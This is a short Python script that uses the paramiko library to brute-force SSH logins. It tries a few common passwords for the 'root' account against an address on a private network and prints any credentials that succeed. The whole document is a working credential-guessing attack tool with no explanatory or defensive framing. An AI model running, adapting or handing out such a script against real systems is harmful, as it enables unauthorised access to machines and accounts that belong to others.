import paramiko

def ssh_brute_force(ip, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(ip, username=username, password=password)
        print(f"[+] Found credentials: {username}:{password}")
    except paramiko.AuthenticationException:
        print(f"[-] Failed login: {username}:{password}")
    ssh.close()

ip = "192.168.1.1"
username = "root"
passwords = ["password123", "admin", "root"]

for password in passwords:
    ssh_brute_force(ip, username, password)
